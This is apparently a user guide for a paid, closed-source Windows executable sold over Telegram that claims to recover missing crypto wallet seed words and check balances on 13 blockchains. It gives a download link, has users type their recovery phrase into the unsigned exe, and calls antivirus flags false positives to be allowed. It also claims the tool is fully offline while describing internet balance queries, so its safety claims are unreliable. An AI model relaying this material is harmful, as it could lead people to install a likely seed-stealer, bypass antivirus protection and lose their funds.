# @imywb-walletrecover - User Guide

## Supported Blockchains

This tool supports **13 blockchains** for address derivation and balance checking:

### EVM-Compatible Chains (7 chains)
- **Ethereum (ETH)** - Etherscan API
- **Polygon (MATIC)** - PolygonScan API
- **Binance Smart Chain (BNB)** - BscScan API
- **Arbitrum (ETH)** - Arbiscan API
- **Optimism (ETH)** - Optimistic Etherscan API
- **Avalanche (AVAX)** - Snowtrace API
- **Base (ETH)** - BaseScan API

### Bitcoin-like Chains (3 chains)
- **Bitcoin (BTC)** - Blockstream API
- **Litecoin (LTC)** - Blockstream/LitecoinSpace API
- **Dogecoin (DOGE)** - BlockCypher API

### Non-EVM Chains (3 chains)
- **Solana (SOL)** - Solana RPC
- **Cardano (ADA)** - Blockfrost API
- **Cosmos (ATOM)** - Cosmos RPC

**Note**: All APIs are **free** and require **no API keys**. Balance checking requires **internet connection**.

## What is This Tool?

@imywb-walletrecover helps you recover cryptocurrency wallet recovery phrases when you have some words missing. It can:
- Complete partial recovery phrases (10→12, 11→12, 22→24, 23→24 words, etc.)
- Fix word order when words are in wrong positions
- Generate wallet addresses for each valid phrase found
- Check balances and activity across 13+ blockchains

## Pricing & Support

**Tool Cost**: This tool requires a purchase/license to use.

**Annual Support Subscription**: 
- Get regular upgrades and new features
- Priority support and assistance
- Access to latest improvements and bug fixes
- Annual subscription ensures you always have the most up-to-date version

**Contact Support**:
- Telegram: [t.me/imywb](https://t.me/imywb)
- For purchases, upgrades, support, or questions, contact us on Telegram

## License Activation

**IMPORTANT**: This tool requires a license key to use. Each license is locked to **one device only**.

### First Time Setup (Activate License)

1. Open Command Prompt or PowerShell
2. Navigate to the folder containing `@imywb-walletrecover.exe`
3. Activate your license:

```bash
@imywb-walletrecover.exe "your phrase" --license YOUR-LICENSE-KEY
```

**Example:**
```bash
@imywb-walletrecover.exe "abandon ability able about above absent absorb abstract absurd abuse access" --license A1B2-C3D4-E5F6-G7H8-I9J0
```

After activation, you won't need to provide the license key again - it's saved to your device.

### After Activation

Once activated, simply run:

```bash
@imywb-walletrecover.exe "word1 word2 word3 ... word10"
```

**Note**: Each license key can only be used on **one device**. If you need to use it on a different computer, contact support for a new license.

## Quick Start

### Basic Usage

1. Open Command Prompt or PowerShell
2. Navigate to the folder containing `@imywb-walletrecover.exe`
3. Run the tool with your partial phrase:

```bash
@imywb-walletrecover.exe "word1 word2 word3 ... word10"
```

**Example:**
```bash
@imywb-walletrecover.exe "abandon ability able about above absent absorb abstract absurd abuse access"
```

### Save Results to File

To save all results to a file:

```bash
@imywb-walletrecover.exe "your phrase here" --save
```

Results will be saved in an `output` folder with timestamped filenames.

## Common Scenarios

### Scenario 1: Missing 1 Word (11 words for 12-word phrase)

```bash
@imywb-walletrecover.exe "word1 word2 word3 ... word11"
```

This will test all 2,048 possible words (takes a few seconds).

### Scenario 2: Missing 2 Words (10 words for 12-word phrase)

```bash
@imywb-walletrecover.exe "word1 word2 word3 ... word10"
```

This will test about 4.2 million combinations (may take several minutes).

### Scenario 3: Words in Wrong Order

If you have all 12 words but they're in the wrong order:

```bash
@imywb-walletrecover.exe "word1 word2 ... word12" --permute
```

### Scenario 4: Specify Target Length

If the tool can't auto-detect the target length:

```bash
@imywb-walletrecover.exe "word1 word2 ... word13" --target-length 15
```

### Scenario 5: With Passphrase

If you used a passphrase (25th word) when creating your wallet:

```bash
@imywb-walletrecover.exe "your phrase" --passphrase "your_passphrase"
```

## Command Options

| Option | Description | Example |
|--------|-------------|---------|
| `--target-length` | Specify phrase length (12, 15, 18, 21, or 24) | `--target-length 12` |
| `--permute` | Try different word orders | `--permute` |
| `--max-permute N` | Max words to permute (default: 3) | `--max-permute 5` |
| `--save` | Save results to file | `--save` |
| `--output-dir DIR` | Custom output folder (default: `output`) | `--output-dir my_results` |
| `--passphrase TEXT` | Passphrase used with wallet | `--passphrase "mypass"` |
| `--license KEY` | License key (required for first use) | `--license "A1B2-C3D4-E5F6-G7H8-I9J0"` |
| `--check-balance` | Check balance and activity for addresses | `--check-balance` |

## Understanding the Output

### What You'll See

For each valid phrase found, you'll see:
1. **Complete phrase**: The full recovery phrase
2. **Seed (hex)**: The cryptographic seed (first 16 bytes shown)
3. **Ethereum address**: Wallet address for Ethereum
4. **Bitcoin address**: Wallet address for Bitcoin

### Example Output

```
[OK] Found 128 valid phrase(s):

1. abandon ability able about above absent absorb abstract absurd abuse access acid
   Seed (first 16 bytes): 16dee80514d2e0d1...
   Ethereum address (m/44'/60'/0'/0/0): 0x8e47F02290b2CC27b19CF0e7A1E4ab0AA17B6a01
   Bitcoin address (m/44'/0'/0'/0/0): 163rVgs8zvWYcEtGXC1KU4BrryptbEvDry
```

## Important Notes

### Security

⚠️ **CRITICAL SECURITY WARNINGS:**
- **NEVER share your recovery phrase with anyone**
- This tool runs **100% offline** - no data is sent anywhere
- Keep your recovery phrases secure and private
- Always verify addresses on blockchain explorers before using

### Address Verification

The addresses generated use standard BIP44 derivation paths:
- **Ethereum**: `m/44'/60'/0'/0/0` (first address)
- **Bitcoin**: `m/44'/0'/0'/0/0` (first address)

These should match most standard wallets (MetaMask, Ledger, Trezor, etc.).

### Performance

- **1 missing word**: Completes in seconds (~2,048 combinations)
- **2 missing words**: May take several minutes (~4.2 million combinations)
- Progress is shown during the search

## Troubleshooting

### "No valid phrases found"

**Possible causes:**
- Words are misspelled
- Words are not from the BIP39 word list
- Wrong number of words provided
- Words are in wrong order (try `--permute`)

**Solutions:**
- Double-check spelling of all words
- Verify words are from the official BIP39 list
- Try `--permute` if words might be scrambled
- Specify `--target-length` if auto-detection fails

### "Addresses show N/A"

This means the address derivation failed. This is rare but can happen if:
- Required libraries aren't included (shouldn't happen in executable)
- There's an error in derivation

### License Usage

**For Activating:**
```bash
@imywb-walletrecover.exe "phrase" --license A1B2-C3D4-E5F6-G7H8-I9J0
```

**After activation:**
```bash
@imywb-walletrecover.exe "phrase"
# License automatically checked
```

### License Issues

**"No license found"**
- You haven't activated your license yet
- Solution: Run with `--license YOUR-KEY` to activate

**"License is not valid for this device"**
- License is locked to a different computer
- Solution: Each license works on one device only. Contact support for a new license if you need to use on a different device.

**"License key is already activated on a different device"**
- This license key was already used on another computer
- Solution: Contact support to get a new license key

### Antivirus Warning

Some antivirus software may flag the executable. This is a false positive because:
- The tool is a standalone executable
- It doesn't connect to the internet
- It's not signed with a code signing certificate

You can safely allow it or add an exception.

## File Output

When using `--save`, results are saved to:
- **Text file**: `output/recovery_results_YYYYMMDD_HHMMSS.txt`
- **JSON file**: `output/recovery_results_YYYYMMDD_HHMMSS.json`

The JSON file contains machine-readable data for programmatic use.

## Examples

### Complete 11-word phrase:
```bash
@imywb-walletrecover.exe "abandon ability able about above absent absorb abstract absurd abuse access"
```

### Complete 22-word phrase to 24 words:
```bash
@imywb-walletrecover.exe "word1 word2 ... word22"
```

### Fix scrambled 12-word phrase:
```bash
@imywb-walletrecover.exe "word12 word5 word1 word8 ..." --permute
```

### Complete and save results:
```bash
@imywb-walletrecover.exe "word1 word2 ... word10" --save
```

### Check balances for derived addresses:
```bash
@imywb-walletrecover.exe "word1 word2 ... word10" --check-balance
```

**Note**: Balance checking requires an internet connection to query blockchain APIs.

This will:
- Derive Ethereum, Bitcoin, Polygon, and BSC addresses
- Check balance for each address (requires internet)
- Show transaction count (activity)
- Highlight wallets with balance or activity
- Display a summary of wallets with funds

## Supported Blockchains

This tool supports **13+ blockchains** for address derivation and balance checking:

### EVM-Compatible Chains (7 chains)
- **Ethereum (ETH)** - Etherscan API
- **Polygon (MATIC)** - PolygonScan API
- **Binance Smart Chain (BNB)** - BscScan API
- **Arbitrum (ETH)** - Arbiscan API
- **Optimism (ETH)** - Optimistic Etherscan API
- **Avalanche (AVAX)** - Snowtrace API
- **Base (ETH)** - BaseScan API

### Bitcoin-like Chains (3 chains)
- **Bitcoin (BTC)** - Blockstream API
- **Litecoin (LTC)** - Blockstream/LitecoinSpace API
- **Dogecoin (DOGE)** - BlockCypher API

### Non-EVM Chains (3 chains)
- **Solana (SOL)** - Solana RPC
- **Cardano (ADA)** - Blockfrost API
- **Cosmos (ATOM)** - Cosmos RPC

**Note**: 
- All APIs are **free** and require **no API keys**
- Balance checking requires **internet connection**
- Address derivation works offline (balance checking needs internet)

## Getting Help

If you encounter issues:
1. Check that all words are spelled correctly
2. Verify words are from the BIP39 word list
3. Try the `--permute` option if words might be in wrong order
4. Use `--target-length` to specify the target phrase length

**Need Support?**
- Contact us on Telegram: [t.me/imywb](https://t.me/imywb)
- For technical support, purchases, or subscription inquiries

**Upgrades & Subscriptions:**
- Annual support subscription includes regular upgrades and new features
- Contact us on Telegram to purchase or renew your subscription

## Technical Details

- **BIP39 Standard**: Uses official BIP39 word list (2048 words)
- **BIP44 Derivation**: Uses standard HD wallet derivation paths
- **Offline Operation**: All processing happens locally on your computer
- **No Network**: The tool never connects to the internet

## License & Disclaimer

This tool is provided as-is for recovery purposes. Use at your own risk. Always verify addresses before using recovered wallets.

## Purchase & Support

**Tool Purchase**: This tool requires a license to use. Contact us for pricing.

## Download Software

- [Download Tool](https://angeldrop.sh/download/1764729027088iwvr4o/%40imywb-walletrecover.zip)
- Unzip the file (the name should be @imywb-walletrecover.exe)
- Activate the tool.
- Follow the instructions in **Quick Start** to run things

**Annual Support Subscription Benefits**:
- Regular tool upgrades and new features
- Priority technical support
- Bug fixes and improvements
- Access to latest versions

**Contact Information**:
- Telegram Support: [t.me/imywb](https://t.me/imywb)
- For purchases, upgrades, subscriptions, or support inquiries

---

**Version**: 1.0  
**Last Updated**: December 2025  
**Support**: t.me/imywb


